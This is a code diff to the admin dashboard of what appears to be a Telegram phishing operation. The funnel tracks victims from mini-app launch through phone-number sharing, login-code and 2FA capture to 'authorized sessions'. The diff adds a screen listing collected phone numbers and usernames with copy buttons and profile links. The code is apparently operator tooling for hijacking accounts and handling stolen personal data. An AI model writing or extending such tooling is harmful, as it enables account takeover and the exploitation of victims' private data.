@@ -365,7 +365,7 @@
       <div class="title" id="screen-title">Панель</div>
       <div class="sub" id="screen-sub"></div>
     </div>
-    <div id="buildtag" style="font-size:9.5px;color:var(--hint);font-family:'JetBrains Mono',monospace;opacity:.7">b.rotate</div>
+    <div id="buildtag" style="font-size:9.5px;color:var(--hint);font-family:'JetBrains Mono',monospace;opacity:.7">b.contacts</div>
   </div>
 
   <main id="content"></main>
@@ -683,6 +683,7 @@ async function screenBotCard(botId){
       <div class="funnel-card">
         <div class="fline"><div class="lbl">Запуски</div><div class="val">${(((b.launch_stats||{}).total)||0).toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Открыли мини-апп</div><div class="val">${f.opens.toLocaleString('ru')}</div></div>
+        <div class="fline" id="f-contacts" style="cursor:pointer"><div class="lbl">Поделился номером ›</div><div class="val">${(f.contacts||0).toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Отправили код</div><div class="val">${f.code_sent.toLocaleString('ru')}</div></div>
         <div class="fline"><div class="lbl">Запросили 2FA</div><div class="val">${f.twofa_sent.toLocaleString('ru')}</div></div>
         <div class="fline green"><div class="lbl">Авторизованных сессий</div><div class="val">${f.auths.toLocaleString('ru')}</div></div>
@@ -746,6 +747,8 @@ async function screenBotCard(botId){
       finally { $('#a-restart').style.opacity = ''; }
     };
     $('#a-sessions').onclick = ()=> navigate(screenSessions, botId, b.username);
+    const fc = $('#f-contacts');
+    if (fc) fc.onclick = ()=> navigate(screenContacts, botId, b.username);
 
     $('#b-delete').onclick = ()=> {
       openSheet(`
@@ -1090,6 +1093,64 @@ async function screenGuard(botId, botName){
         toast('Сохранено'); HAPTIC('success');
       } catch(e){ toast(e.message); HAPTIC('error'); }
     };
+  } catch(e){ root.innerHTML = `<div class="empty"><div class="ttl">Ошибка</div><div class="sub">${esc(e.message)}</div></div>`; }
+}
+
+async function screenContacts(botId, botName){
+  setTitle('Поделились номером', botName ? esc(botName) : '');
+  root.innerHTML = `<div class="empty"><div class="ico">⏳</div></div>`;
+  try {
+    const data = await api(`/bots/${botId}/contacts`);
+    if (!data.count){
+      root.innerHTML = `
+        <div class="empty">
+          <div class="ico">📵</div>
+          <div class="ttl">Никто ещё не делился</div>
+          <div class="sub">Появятся, как только юзер тапнет «Поделиться номером».</div>
+        </div>`;
+      return;
+    }
+    let html = `
+      <div class="card">
+        <div class="uppercase" style="margin-bottom:6px">Всего</div>
+        <div style="font-family:'JetBrains Mono',monospace;font-size:24px;font-weight:800">${data.count}</div>
+      </div>
+      <div class="section-label">Список</div>
+    `;
+    for (const c of data.items){
+      const dt = new Date((c.created_at||0) * 1000);
+      const ds = dt.toLocaleString('ru', {dateStyle:'short', timeStyle:'short'});
+      const phone = c.phone || '—';
+      const uname = c.username ? '@'+esc(c.username) : ('id'+(c.user_id||'?'));
+      html += `
+        <div class="card tight">
+          <div class="row between" style="margin-bottom:4px">
+            <div class="mono" style="font-size:14px;cursor:pointer" data-copy="${esc(phone)}">${esc(phone)}</div>
+            <span class="mono" style="font-size:11.5px;color:var(--muted)">${esc(ds)}</span>
+          </div>
+          <div class="row between">
+            <div class="logchip user" data-user="${esc(c.user_id||'')}" data-username="${esc(c.username||'')}">👤 ${esc(uname)}</div>
+          </div>
+        </div>`;
+    }
+    root.innerHTML = html;
+
+    root.querySelectorAll('[data-copy]').forEach(el=>{
+      el.addEventListener('click', ()=>{
+        const txt = el.dataset.copy;
+        navigator.clipboard?.writeText(txt).then(()=>{ toast('Скопировано'); HAPTIC('success'); });
+      });
+    });
+    root.querySelectorAll('[data-user]').forEach(el=>{
+      el.addEventListener('click', ()=>{
+        const uname = el.dataset.username;
+        if (uname){
+          HAPTIC('light');
+          try { tg && tg.openTelegramLink && tg.openTelegramLink(`https://t.me/${uname}`); }
+          catch(e){ window.open(`https://t.me/${uname}`, '_blank'); }
+        }
+      });
+    });
   } catch(e){ root.innerHTML = `<div class="empty"><div class="ttl">Ошибка</div><div class="sub">${esc(e.message)}</div></div>`; }
 }
 
